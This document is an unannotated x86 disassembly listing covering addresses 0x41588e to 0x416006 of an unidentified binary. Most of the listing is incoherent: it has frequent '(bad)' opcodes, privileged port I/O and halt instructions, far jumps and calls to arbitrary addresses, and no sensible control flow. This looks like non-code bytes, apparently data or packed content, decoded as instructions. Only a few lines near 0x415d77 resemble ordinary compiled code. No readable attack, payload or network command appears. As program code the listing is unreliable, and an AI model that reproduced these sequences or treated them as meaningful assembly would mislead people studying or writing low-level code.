  41588e:	inc    eax
  41588f:	ret    
  415890:	adc    ah,dh
  415892:	push   0xffffffad
  415894:	add    eax,0x9cb0e70c
  415899:	adc    al,0xf0
  41589b:	ret    0xd3f9
  41589e:	jecxz  0x4158e8
  4158a0:	(bad)  
  4158a1:	jmp    0x516c:0xe941a8fa
  4158a8:	and    eax,0x82ec889b
  4158ad:	test   eax,0x6ee13b75
  4158b2:	jns    0x415933
  4158b4:	add    BYTE PTR [ecx+0x17113305],0xb8
  4158bb:	sub    al,dh
  4158bd:	xchg   edi,eax
  4158be:	in     eax,0x55
  4158c0:	fild   DWORD PTR [edx+0x69b0d4a3]
  4158c6:	push   ebx
  4158c7:	jmp    0x541b:0x4946233a
  4158ce:	clc    
  4158cf:	iret   
  4158d0:	jge    0x415938
  4158d2:	inc    edi
  4158d3:	sub    eax,0xf20818d2
  4158d8:	mov    al,ds:0xad4d4e99
  4158dd:	jmp    0x4158cf
  4158df:	out    dx,eax
  4158e0:	aaa    
  4158e1:	mov    eax,ds:0xd1b6bc10
  4158e6:	hlt    
  4158e7:	cmp    al,0xcb
  4158e9:	sahf   
  4158ea:	jb     0x4158a1
  4158ec:	in     eax,0x96
  4158ee:	or     bl,0x5d
  4158f1:	cmp    BYTE PTR [edi+0x5767693d],0xf0
  4158f8:	(bad)  
  4158fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158fb:	sub    ecx,DWORD PTR [esi-0x30]
  4158fe:	xchg   BYTE PTR cs:[edi-0x1],bh
  415902:	cmp    DWORD PTR [esi-0x5],edx
  415905:	in     al,0xa0
  415907:	sub    edi,DWORD PTR [eax+0x32]
  41590a:	push   WORD PTR [edi-0x5c]
  41590e:	dec    esi
  41590f:	addr16 dec edx
  415911:	jecxz  0x415957
  415913:	arpl   WORD PTR [esi-0x62],bp
  415916:	cld    
  415917:	pop    ecx
  415918:	xor    eax,0xcd083d76
  41591d:	imul   ebx,DWORD PTR [ebx+0x505acd2d],0xd11e5d20
  415927:	(bad)  
  415928:	cwde   
  415929:	fsubp  st(5),st
  41592b:	aaa    
  41592c:	inc    edi
  41592d:	sub    al,0x20
  41592f:	xchg   edx,eax
  415930:	ja     0x415933
  415932:	rcl    eax,cl
  415934:	sbb    esp,DWORD PTR [edx]
  415936:	cs cwde 
  415938:	xor    al,0xff
  41593a:	xchg   edi,eax
  41593b:	aas    
  41593c:	cmc    
  41593d:	xor    al,0xf4
  41593f:	retf   0xc166
  415942:	inc    edi
  415943:	dec    edx
  415944:	pushf  
  415945:	adc    al,BYTE PTR [esi+0x60]
  415948:	mov    ecx,0x9e0e1510
  41594d:	cmp    ch,BYTE PTR [ebx-0x498a71ec]
  415953:	sub    BYTE PTR [eax-0x67],ah
  415956:	mov    cl,0xd1
  415958:	and    al,0x16
  41595a:	mov    al,0x1c
  41595c:	gs xor eax,0x7e727fed
  415962:	add    al,0x63
  415964:	fdivr  DWORD PTR [edi+0x32d85abe]
  41596a:	retf   0xde47
  41596d:	repz mov ah,0x6a
  415970:	das    
  415971:	sahf   
  415972:	mul    DWORD PTR [ebx+eiz*2+0x79]
  415976:	(bad)  
  415977:	out    0x19,eax
  415979:	les    esp,FWORD PTR [ebx-0x78]
  41597c:	shl    BYTE PTR [edx+0x103391f5],cl
  415982:	test   al,0x28
  415984:	jb     0x415a02
  415986:	dec    ecx
  415987:	or     dh,al
  415989:	lods   al,BYTE PTR ds:[esi]
  41598a:	clc    
  41598b:	mov    WORD PTR [edi+0x3308068e],gs
  415991:	shl    BYTE PTR [eax-0x2b],0xb5
  415995:	sub    BYTE PTR [ebp+0x6c],cl
  415998:	jbe    0x4159db
  41599a:	pop    ebp
  41599b:	add    eax,0x65c3563e
  4159a0:	loop   0x415a0a
  4159a2:	xor    esp,DWORD PTR [esi+0x55]
  4159a5:	and    cl,ah
  4159a7:	inc    esi
  4159a8:	pop    edi
  4159a9:	cmovo  edx,DWORD PTR ds:[edi]
  4159ad:	jmp    0x415998
  4159af:	mov    cl,0xc8
  4159b1:	push   ds
  4159b2:	mov    bh,0xb9
  4159b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159b5:	push   esp
  4159b6:	add    esi,ebx
  4159b8:	fistp  QWORD PTR [eax+0x72]
  4159bb:	fiadd  WORD PTR [edx-0x36]
  4159be:	jmp    0x901ccc24
  4159c3:	adc    DWORD PTR [ebx+0x60da6f44],edx
  4159c9:	shl    DWORD PTR [ecx+0x745f4126],cl
  4159cf:	es sub eax,eax
  4159d2:	push   esp
  4159d3:	jge    0x415974
  4159d5:	and    DWORD PTR [ecx-0x7047656b],ecx
  4159db:	sbb    bl,ah
  4159dd:	and    bl,dl
  4159df:	push   es
  4159e0:	xchg   dh,bh
  4159e2:	cmp    ah,BYTE PTR ds:0x5f2fc6fb
  4159e8:	adc    DWORD PTR [eax-0x1b],esi
  4159eb:	shr    BYTE PTR ds:0x6ba2c928,0x3c
  4159f2:	sbb    DWORD PTR [edx-0x71d4aad0],edx
  4159f8:	test   dl,dl
  4159fa:	cmp    al,0x64
  4159fc:	aaa    
  4159fd:	push   edi
  4159fe:	inc    edx
  4159ff:	scas   al,BYTE PTR es:[edi]
  415a00:	ja     0x415a79
  415a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a03:	mov    ds:0x5da1033b,al
  415a08:	inc    eax
  415a09:	pusha  
  415a0a:	div    BYTE PTR [ebp-0x79813b79]
  415a10:	cdq    
  415a11:	mov    ah,0x94
  415a13:	enter  0x5c12,0x97
  415a17:	pusha  
  415a18:	sbb    eax,0x8051a582
  415a1d:	sbb    bl,bh
  415a1f:	xchg   edi,eax
  415a20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a21:	push   ebx
  415a22:	lahf   
  415a23:	inc    ebp
  415a24:	mov    ah,0x7c
  415a26:	pushf  
  415a27:	xchg   esp,eax
  415a28:	test   ah,ch
  415a2a:	stos   BYTE PTR es:[edi],al
  415a2b:	sar    BYTE PTR [edx-0x3b],1
  415a2e:	push   ebp
  415a2f:	mov    dh,0x72
  415a31:	xchg   ebp,eax
  415a32:	mov    al,ds:0xbf5937d5
  415a37:	stos   BYTE PTR es:[edi],al
  415a38:	gs (bad) 
  415a3a:	push   ds
  415a3b:	sbb    al,0xda
  415a3d:	repnz mov edi,0xa87fe56e
  415a43:	jl     0x415a89
  415a45:	stc    
  415a46:	aaa    
  415a47:	and    edi,DWORD PTR [ebx+0x3e]
  415a4a:	push   cs
  415a4b:	push   esi
  415a4c:	jb     0x415a85
  415a4e:	mov    ebx,0x195a5bd7
  415a53:	inc    edx
  415a54:	dec    eax
  415a55:	mov    ah,0xe0
  415a57:	sbb    ebx,edx
  415a59:	cmp    bh,BYTE PTR [ecx]
  415a5b:	in     eax,dx
  415a5c:	mov    ecx,DWORD PTR [esi+0x6a9e266a]
  415a62:	cld    
  415a63:	push   edi
  415a64:	adc    al,0x61
  415a66:	inc    ebp
  415a67:	nop
  415a68:	push   ds
  415a69:	xchg   ebx,eax
  415a6a:	fstp   DWORD PTR [eax-0x43]
  415a6d:	iret   
  415a6e:	ret    0x4347
  415a71:	aam    0xaf
  415a73:	fsub   QWORD PTR [esi-0xb]
  415a76:	mov    ds:0x3e9435c0,eax
  415a7b:	adc    edx,DWORD PTR [esi]
  415a7d:	pop    ebp
  415a7f:	push   esp
  415a80:	jo     0x415aa2
  415a82:	(bad)  
  415a83:	les    ebx,FWORD PTR [ebp+0x11caef5]
  415a89:	jae    0x415abe
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	push   esp
  415aa5:	imul   DWORD PTR [ecx]
  415aa7:	into   
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415b29
  415ab1:	fmulp  st(6),st
  415ab3:	aaa    
  415ab4:	(bad)  
  415ab5:	popf   
  415ab6:	push   ds
  415ab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ab8:	shl    BYTE PTR [ebx],cl
  415aba:	or     esp,DWORD PTR [esi-0x470984a1]
  415ac0:	clc    
  415ac1:	test   ebp,edx
  415ac3:	es mov ch,0xeb
  415ac6:	inc    ecx
  415ac7:	mov    esi,0x1863cc18
  415acc:	call   0xaa04188e
  415ad1:	jg     0x415a59
  415ad3:	ins    BYTE PTR es:[edi],dx
  415ad4:	inc    edi
  415ad5:	loope  0x415a5c
  415ad7:	sahf   
  415ad8:	call   ecx
  415ada:	xchg   ebp,eax
  415adb:	bound  esp,QWORD PTR [esi]
  415add:	xor    DWORD PTR [ecx+0x68ac27a3],0x171c8d4c
  415ae7:	and    DWORD PTR [ecx+0x48],eax
  415aea:	aam    0x25
  415aec:	mov    eax,esp
  415aee:	jne    0x415b6f
  415af0:	mov    al,ds:0xeb294b95
  415af5:	lock sub BYTE PTR [ecx-0x3fa7eb0a],dh
  415afc:	div    DWORD PTR [edi-0x7c]
  415aff:	inc    esp
  415b00:	add    al,0xae
  415b02:	(bad)  
  415b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b04:	(bad)  
  415b05:	stc    
  415b06:	loope  0x415b62
  415b08:	jb     0x415b29
  415b0a:	arpl   WORD PTR [esi+0x68ffbd68],di
  415b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b11:	inc    eax
  415b12:	ins    DWORD PTR es:[edi],dx
  415b13:	pop    es
  415b14:	jecxz  0x415b30
  415b16:	dec    ecx
  415b17:	fidivr WORD PTR [edi]
  415b19:	lods   eax,DWORD PTR ds:[esi]
  415b1a:	mov    ds:0x36b2e085,al
  415b1f:	dec    edi
  415b20:	add    ebx,DWORD PTR [ebx-0x1c]
  415b23:	les    ebx,FWORD PTR [ebx+0x30]
  415b26:	(bad)  
  415b27:	xlat   BYTE PTR ds:[ebx]
  415b28:	push   esi
  415b29:	ja     0x415aed
  415b2b:	xlat   BYTE PTR ds:[ebx]
  415b2c:	popa   
  415b2d:	sti    
  415b2e:	mov    dh,0x53
  415b30:	(bad)  
  415b31:	mov    dh,0x8a
  415b33:	pop    esp
  415b34:	movq   mm3,mm1
  415b37:	js     0x415b3b
  415b39:	push   ss
  415b3a:	xor    bh,BYTE PTR [edx+0x65]
  415b3d:	out    dx,al
  415b3e:	(bad)  [ebx-0x6a]
  415b41:	aad    0xae
  415b43:	xchg   esp,eax
  415b44:	stc    
  415b45:	(bad)  
  415b46:	cmp    ebx,DWORD PTR [ecx+0x9]
  415b49:	mov    ah,0xc3
  415b4b:	neg    BYTE PTR [esi]
  415b4d:	sub    BYTE PTR [esi+edi*8+0x2dbabb89],cl
  415b54:	scas   eax,DWORD PTR es:[edi]
  415b55:	mov    esi,0x4d4d7820
  415b5a:	enter  0x92cb,0x87
  415b5e:	mov    ah,0x37
  415b60:	stos   BYTE PTR es:[edi],al
  415b61:	shl    BYTE PTR [ecx+0xfd60573],cl
  415b67:	leave  
  415b68:	inc    edi
  415b69:	das    
  415b6a:	bound  edi,QWORD PTR [esi]
  415b6c:	jmp    0xf5e6:0x74200ae8
  415b73:	jns    0x415bce
  415b75:	call   FWORD PTR [ebx+0x19]
  415b78:	stos   BYTE PTR es:[edi],al
  415b79:	and    eax,0xbd02c682
  415b7e:	lods   eax,DWORD PTR ds:[esi]
  415b7f:	and    eax,0x4f83f07e
  415b84:	and    eax,0xc38b0eae
  415b89:	rol    BYTE PTR [esp+eax*2-0x5b71e4f4],0x8d
  415b91:	jl     0x415b48
  415b93:	aad    0x60
  415b95:	fadd   QWORD PTR [ebp+esi*2+0x1c0bd205]
  415b9c:	jecxz  0x415b5c
  415b9e:	ficomp WORD PTR [ebp-0x7e]
  415ba1:	sti    
  415ba2:	push   ss
  415ba3:	std    
  415ba4:	mov    DWORD PTR [esi],ecx
  415ba6:	and    edi,edx
  415ba8:	sub    al,0xe7
  415baa:	cmp    ebx,DWORD PTR [ecx-0x48]
  415bad:	test   al,0x1e
  415baf:	test   eax,0x59d16f27
  415bb4:	adc    esi,DWORD PTR [ebp-0x1c]
  415bb7:	sbb    DWORD PTR [esp+eax*4],eax
  415bba:	xor    al,0x97
  415bbc:	loop   0x415bd9
  415bbe:	fcomip st,st(7)
  415bc0:	in     al,0xa
  415bc2:	adc    BYTE PTR [eax],bl
  415bc4:	inc    esi
  415bc5:	adc    esp,DWORD PTR [edx]
  415bc7:	in     al,dx
  415bc8:	cmp    al,0x77
  415bca:	mov    dl,BYTE PTR [esi+0x1c]
  415bcd:	mov    edx,esp
  415bcf:	cld    
  415bd0:	lods   eax,DWORD PTR ds:[esi]
  415bd1:	cdq    
  415bd2:	sti    
  415bd3:	ins    DWORD PTR es:[edi],dx
  415bd4:	push   edx
  415bd5:	les    edi,FWORD PTR [edx+0x4f]
  415bd8:	mov    bh,0xfd
  415bda:	or     BYTE PTR [ecx+ebx*2+0x3],cl
  415bde:	sbb    DWORD PTR [ebx+esi*4-0x545ce29d],0xfffffff2
  415be6:	xchg   ebx,eax
  415be7:	mov    dl,BYTE PTR [edi-0x59]
  415bea:	pop    esi
  415beb:	lock mov edx,0x5416462d
  415bf1:	sub    BYTE PTR ds:0xc492d281,dl
  415bf7:	jnp    0x415c68
  415bf9:	repz sbb DWORD PTR [edi+0x66],ecx
  415bfd:	fnstenv [edi]
  415bff:	jmp    0x6c75:0xc4651be5
  415c06:	jecxz  0x415be7
  415c08:	ja     0x415c6b
  415c0a:	gs pop esp
  415c0c:	pop    ds
  415c0d:	ret    0xd63e
  415c10:	inc    esi
  415c11:	xor    ah,dh
  415c13:	mov    esp,0x100ff826
  415c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c19:	mov    bh,0xe4
  415c1b:	sbb    ebx,0xffffffb0
  415c1e:	inc    ebp
  415c1f:	and    BYTE PTR [eax-0x3e],bh
  415c22:	inc    eax
  415c23:	dec    esp
  415c24:	sahf   
  415c25:	jmp    0xabdea384
  415c2a:	ret    0x4656
  415c2d:	test   al,0xc0
  415c2f:	and    eax,ebp
  415c31:	lods   al,BYTE PTR ds:[esi]
  415c32:	lea    eax,[edi+ebx*4]
  415c35:	adc    eax,0xe8866929
  415c3a:	cmp    edi,DWORD PTR [edx]
  415c3c:	inc    edi
  415c3d:	loopne 0x415bfb
  415c3f:	mov    al,0x8b
  415c41:	sub    BYTE PTR [ecx],dl
  415c43:	push   ds
  415c44:	xor    DWORD PTR [ebx+0x2f],esp
  415c47:	retf   
  415c48:	pop    di
  415c4a:	in     eax,dx
  415c4b:	sbb    BYTE PTR [ebx+0x78],al
  415c4e:	retf   0x257b
  415c51:	fisttp QWORD PTR [esi]
  415c53:	dec    ebx
  415c54:	cld    
  415c55:	test   al,0x87
  415c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c58:	push   edx
  415c59:	mov    eax,ds:0x5c80c117
  415c5e:	das    
  415c5f:	ins    BYTE PTR es:[edi],dx
  415c60:	mov    eax,ds:0x127485c6
  415c65:	push   ebp
  415c66:	imul   eax,DWORD PTR [ecx-0x28],0x93409c6a
  415c6d:	or     BYTE PTR [esi-0x19],ch
  415c70:	mov    WORD PTR ds:0x7aa1b6ba,?
  415c76:	push   es
  415c77:	mov    edi,esp
  415c79:	out    0xb8,eax
  415c7b:	into   
  415c7c:	popf   
  415c7d:	leave  
  415c7e:	aaa    
  415c7f:	xchg   edi,eax
  415c80:	iret   
  415c81:	cs mov ecx,0x55bfa8d2
  415c87:	push   ds
  415c88:	shr    ah,1
  415c8a:	mov    dl,0xcd
  415c8c:	dec    esp
  415c8d:	test   DWORD PTR [edx],ecx
  415c8f:	mov    eax,0xa5d25c08
  415c94:	mov    ebx,0xb66739dc
  415c99:	lock clc 
  415c9b:	fwait
  415c9c:	jae    0x415c7d
  415c9e:	add    BYTE PTR ds:0xba86a3a5,ah
  415ca4:	sub    al,0xa1
  415ca6:	mov    esi,0xaeaa9295
  415cac:	ffreep st(4)
  415cae:	sbb    ebp,DWORD PTR [ebx+eax*1+0x4200006b]
  415cb5:	xchg   ecx,eax
  415cb6:	sub    cl,BYTE PTR [esi]
  415cb8:	loopne 0x415c41
  415cba:	fcom   QWORD PTR [esi-0x7fb77220]
  415cc0:	mov    ebp,0x4c2df085
  415cc5:	and    BYTE PTR [edx+0x48dcac6e],0x62
  415ccc:	int    0xc
  415cce:	mov    ch,0xe2
  415cd0:	call   0xa4942918
  415cd5:	pop    ecx
  415cd6:	dec    edi
  415cd7:	cs ret 
  415cd9:	sbb    ah,bl
  415cdb:	call   0xf7fb41b7
  415ce0:	bound  ebp,QWORD PTR [esp+esi*1+0x49a920ff]
  415ce7:	mov    bl,dh
  415ce9:	lea    edi,[ebx+0x33]
  415cec:	out    dx,eax
  415ced:	(bad)  
  415cee:	in     al,dx
  415cef:	xor    eax,0x380e01e3
  415cf4:	mov    esi,0x53892978
  415cf9:	mov    dh,0xd9
  415cfb:	ret    0xaaab
  415cfe:	cwde   
  415cff:	les    edi,FWORD PTR [ebp+edi*8+0xd]
  415d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d04:	push   ebp
  415d05:	ficom  WORD PTR [ebp+0x6c]
  415d08:	jmp    0x55b8:0x5d863848
  415d0f:	nop
  415d10:	or     esi,DWORD PTR [eax+0x31845f4e]
  415d16:	mov    ah,0x4d
  415d18:	push   esi
  415d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d1a:	loopne 0x415ce4
  415d1c:	in     al,0x73
  415d1e:	add    eax,0x5d450238
  415d23:	push   ebp
  415d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d25:	fdiv   DWORD PTR [eax-0x77]
  415d28:	jp     0x415d79
  415d2a:	scas   eax,DWORD PTR es:[edi]
  415d2b:	das    
  415d2c:	pop    DWORD PTR [esi]
  415d2e:	jae    0x415cbc
  415d30:	sti    
  415d31:	and    BYTE PTR [ecx],cl
  415d33:	push   ebp
  415d34:	(bad)  
  415d35:	jge    0x415cf8
  415d37:	in     al,0xeb
  415d39:	es aam 0xb
  415d3c:	rcl    BYTE PTR [eax],0x77
  415d3f:	and    al,dh
  415d41:	div    DWORD PTR ds:0x912561f0
  415d47:	sub    BYTE PTR [ecx-0x2f],dh
  415d4a:	aam    0x20
  415d4c:	sub    bh,BYTE PTR [esi-0xf3d5733]
  415d52:	cmp    BYTE PTR [ebx+0x48],bl
  415d55:	fld    DWORD PTR [edx+0x64]
  415d58:	sbb    bl,dl
  415d5a:	add    bh,BYTE PTR [esi+0x67e68902]
  415d60:	mov    edx,0x5bdedcd3
  415d65:	xchg   esi,eax
  415d66:	cmp    DWORD PTR [ebp+0x444f32c0],edx
  415d6c:	sahf   
  415d6d:	dec    edi
  415d6e:	cli    
  415d6f:	xchg   edi,eax
  415d70:	sbb    BYTE PTR [ebx+0x9],dl
  415d73:	clc    
  415d74:	xchg   BYTE PTR [edi+ebp*4],ah
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	sahf   
  415d95:	mov    bh,0xff
  415d97:	dec    esp
  415d98:	or     DWORD PTR [edx],0x7eb9707f
  415d9e:	jo     0x415e10
  415da0:	and    al,0xbc
  415da2:	in     eax,0xc3
  415da4:	xchg   ecx,eax
  415da5:	adc    bh,BYTE PTR [esp+edx*1+0x6e]
  415da9:	cmp    DWORD PTR [edi+eiz*4+0x5fcd5f13],ebp
  415db0:	dec    esi
  415db1:	mov    al,ds:0x797409f9
  415db6:	pop    edi
  415db7:	push   edx
  415db8:	pop    edx
  415db9:	sti    
  415dba:	sbb    eax,esi
  415dbc:	and    cl,al
  415dbe:	and    eax,0xd56eed50
  415dc3:	add    DWORD PTR [ecx+0x58],esi
  415dc6:	das    
  415dc7:	aas    
  415dc8:	mov    ah,0x61
  415dca:	pushf  
  415dcb:	pop    esi
  415dcc:	mov    bl,0xca
  415dce:	pop    ds
  415dcf:	nop
  415dd0:	shr    esi,0x75
  415dd3:	push   esp
  415dd4:	ficomp DWORD PTR [esi+0x3d]
  415dd7:	pop    eax
  415dd8:	mov    esp,0xbc03463
  415ddd:	shr    ebp,0x89
  415de0:	outs   dx,DWORD PTR ds:[esi]
  415de1:	out    0x25,al
  415de3:	in     al,0x3f
  415de5:	xor    DWORD PTR [edx],edx
  415de7:	mov    dl,BYTE PTR [ecx]
  415de9:	mov    DWORD PTR [edi-0x1900a04e],eax
  415def:	jg     0x415e0f
  415df1:	xlat   BYTE PTR ds:[ebx]
  415df2:	add    bh,al
  415df4:	jno    0x415dc6
  415df6:	push   ds
  415df7:	dec    ebp
  415df8:	inc    esi
  415df9:	scas   eax,DWORD PTR es:[edi]
  415dfa:	ret    0x2898
  415dfd:	lods   eax,DWORD PTR ds:[esi]
  415dfe:	and    BYTE PTR [ebx],ch
  415e00:	fnsave [eax]
  415e02:	add    dh,ah
  415e04:	pop    ebp
  415e05:	or     DWORD PTR [ebx+0x70],0xe87ebf8c
  415e0c:	mov    dl,0x5c
  415e0e:	push   esi
  415e0f:	in     eax,0x6d
  415e11:	mov    ebx,0x9925b24f
  415e16:	out    0x8c,eax
  415e18:	mov    cl,0x1d
  415e1a:	sub    ecx,edi
  415e1c:	ins    DWORD PTR es:[edi],dx
  415e1d:	mov    DWORD PTR [ebp+0x68],eax
  415e20:	xchg   ebx,eax
  415e21:	xor    BYTE PTR [ebp-0x2724ab3c],ch
  415e27:	sbb    al,BYTE PTR [edi]
  415e29:	pop    edi
  415e2a:	ds pop ds
  415e2c:	adc    DWORD PTR [ebp+0x288b6cf2],0x24
  415e33:	push   ebp
  415e34:	inc    esi
  415e35:	dec    ebx
  415e36:	jne    0x415e17
  415e38:	cmp    ch,BYTE PTR [ebp+0x32]
  415e3b:	fwait
  415e3c:	mov    edi,0xe3f4dfe0
  415e41:	sbb    bh,BYTE PTR [esi+0x32]
  415e44:	stc    
  415e45:	pop    ss
  415e46:	inc    esi
  415e47:	js     0x415dd6
  415e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e4a:	fs (bad) 
  415e4c:	push   ds
  415e4d:	rcr    BYTE PTR [esi+0x7627d464],1
  415e53:	dec    esp
  415e54:	hlt    
  415e55:	call   0x1c19085e
  415e5a:	jnp    0x415e46
  415e5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e5d:	sti    
  415e5e:	lahf   
  415e5f:	pop    esi
  415e60:	pushf  
  415e61:	sbb    cl,BYTE PTR [esi-0x42ebb77b]
  415e67:	(bad)  
  415e68:	jmp    0x415e36
  415e6a:	shl    DWORD PTR [ebx+0x6d183133],cl
  415e70:	arpl   WORD PTR [edi],cx
  415e72:	jae    0x415ecf
  415e74:	mov    BYTE PTR [edx-0x5f],cl
  415e77:	xchg   BYTE PTR ds:0x547d3c2,ch
  415e7d:	or     al,BYTE PTR [edx+0x70]
  415e80:	out    0x8b,eax
  415e82:	jnp    0x415e78
  415e84:	popa   
  415e85:	lea    eax,[ebp+ebp*4-0x5630cd25]
  415e8c:	sub    BYTE PTR [edi-0x4a],0xde
  415e90:	ss or  al,0x8b
  415e93:	daa    
  415e94:	inc    edx
  415e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e96:	add    esi,esi
  415e98:	ins    DWORD PTR es:[edi],dx
  415e99:	mov    ecx,0x40a160b2
  415e9e:	loope  0x415ea0
  415ea0:	in     eax,dx
  415ea1:	dec    esp
  415ea2:	lods   al,BYTE PTR ds:[esi]
  415ea3:	xor    DWORD PTR [edx],0xaa37df22
  415ea9:	imul   ebx,DWORD PTR [edx+0x24],0xffffffef
  415ead:	adc    dh,BYTE PTR [edi]
  415eaf:	neg    BYTE PTR [edx+0x1a]
  415eb2:	nop
  415eb3:	xor    BYTE PTR [ebp+0x78],ch
  415eb6:	mov    eax,ds:0x72e3dcd1
  415ebb:	inc    edx
  415ebc:	test   eax,0x28812d79
  415ec1:	mov    dh,0x2e
  415ec3:	ss mov eax,0x702f864
  415ec9:	shr    BYTE PTR [eax-0xd8f8bdb],cl
  415ecf:	outs   dx,BYTE PTR ds:[esi]
  415ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ed1:	jmp    0x66f3:0xfab14ea6
  415ed8:	xor    al,bl
  415eda:	mov    al,0x32
  415edc:	or     DWORD PTR [edi],esp
  415ede:	aaa    
  415edf:	jmp    0xf078c632
  415ee4:	test   eax,0xff0042c4
  415ee9:	mov    esi,0x68e563c1
  415eee:	xchg   BYTE PTR [ecx+0x1b],ch
  415ef1:	mov    cl,0x41
  415ef3:	inc    ebp
  415ef4:	shl    bl,cl
  415ef6:	push   0x7f4718a1
  415efb:	pop    esi
  415efc:	retf   
  415efd:	mov    ch,0x37
  415eff:	retf   
  415f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f01:	push   edx
  415f02:	add    ecx,esi
  415f04:	stos   DWORD PTR es:[edi],eax
  415f05:	test   BYTE PTR [eax+0x46],cl
  415f08:	scas   eax,DWORD PTR es:[edi]
  415f09:	xchg   esi,eax
  415f0a:	cli    
  415f0b:	add    BYTE PTR [eax-0x1985e5da],0x69
  415f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f13:	daa    
  415f14:	push   ebx
  415f15:	sbb    eax,DWORD PTR [ecx-0x25b503b2]
  415f1b:	sbb    bl,BYTE PTR [edx-0x51]
  415f1e:	add    ebp,DWORD PTR [ebx-0x25]
  415f21:	mov    bh,0x29
  415f23:	and    DWORD PTR ds:0x47dbc321,edi
  415f29:	imul   DWORD PTR [edi+0x3907d9dd]
  415f2f:	and    ebx,DWORD PTR [ecx-0x3f63298f]
  415f35:	sub    eax,0x81896c1c
  415f3a:	mov    dh,ah
  415f3c:	sub    cl,BYTE PTR [edx-0x36]
  415f3f:	test   BYTE PTR [ebp-0x63],bl
  415f42:	sbb    esi,DWORD PTR [edx+0x6a]
  415f45:	xor    al,0x12
  415f47:	sti    
  415f48:	jae    0x415f75
  415f4a:	and    DWORD PTR ds:0xbe2cecd1,0x37
  415f51:	lds    eax,FWORD PTR [ebx+0x50]
  415f54:	retf   
  415f55:	and    edi,DWORD PTR [edi-0x33]
  415f58:	icebp  
  415f59:	inc    edi
  415f5a:	sbb    ch,BYTE PTR [esi-0x44]
  415f5d:	mov    dl,0x98
  415f5f:	cmp    al,0xe8
  415f61:	in     eax,dx
  415f62:	cmp    DWORD PTR [ecx-0x45],0xffffffeb
  415f66:	int3   
  415f67:	cmp    al,ah
  415f69:	inc    ebp
  415f6a:	cmp    BYTE PTR [esp+eax*4+0x4b],dl
  415f6e:	push   cs
  415f6f:	jp     0x415f19
  415f71:	xchg   ebx,eax
  415f72:	sub    DWORD PTR [ebx-0xcf6b3ce],0x1b
  415f79:	pop    bx
  415f7b:	mov    edi,0x49290e01
  415f80:	test   al,0x94
  415f82:	pop    ecx
  415f83:	push   esp
  415f84:	into   
  415f85:	xlat   BYTE PTR ds:[ebx]
  415f86:	and    BYTE PTR [ecx+0x75],cl
  415f89:	test   DWORD PTR [esi],esp
  415f8b:	dec    ebp
  415f8c:	iret   
  415f8d:	stc    
  415f8e:	mov    ch,0xff
  415f90:	jb     0x415fd7
  415f92:	aaa    
  415f93:	mov    dl,0xb5
  415f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f96:	mov    eax,0xc2a39204
  415f9b:	in     al,0x7a
  415f9d:	jo     0x415fee
  415f9f:	(bad)  
  415fa1:	adc    ecx,DWORD PTR [esi]
  415fa3:	xlat   BYTE PTR ds:[ebx]
  415fa4:	cmp    DWORD PTR [eax+0x44ec9c9],esi
  415faa:	dec    edi
  415fab:	sub    eax,0x6533d011
  415fb0:	fist   DWORD PTR ds:0xa6dbe787
  415fb6:	scas   al,BYTE PTR es:[edi]
  415fb7:	in     al,dx
  415fb8:	std    
  415fb9:	fadd   QWORD PTR [ebx+0x4b0c3e4a]
  415fbf:	data16 std 
  415fc1:	addr16 add bl,dh
  415fc4:	pop    es
  415fc5:	sbb    DWORD PTR fs:[eax+0x20],0xffffffaf
  415fca:	daa    
  415fcb:	adc    BYTE PTR [edi+0x430041e],cl
  415fd1:	test   eax,0x19e73ccf
  415fd6:	or     DWORD PTR [ecx+ecx*8-0x29],edx
  415fda:	inc    ecx
  415fdb:	hlt    
  415fdc:	retf   0xd176
  415fdf:	push   esp
  415fe0:	xchg   al,bl
  415fe2:	cld    
  415fe3:	stc    
  415fe4:	scas   al,BYTE PTR es:[edi]
  415fe5:	retf   
  415fe6:	push   esi
  415fe7:	jne    0x415f85
  415fe9:	mov    ebp,0x82068914
  415fee:	sub    ch,BYTE PTR [esi+0x5f]
  415ff1:	xchg   ecx,eax
  415ff2:	xchg   edx,eax
  415ff3:	ret    
  415ff4:	xchg   ebp,eax
  415ff5:	sbb    DWORD PTR [eax-0x7b],esp
  415ff8:	test   DWORD PTR [edi],ebx
  415ffa:	cmp    ecx,DWORD PTR [ecx]
  415ffc:	iret   
  415ffd:	fs cdq 
  415fff:	addr16 out 0xd7,al
  416002:	gs xor cl,cl
  416005:	stc    
  416006:	add    al,0xe8
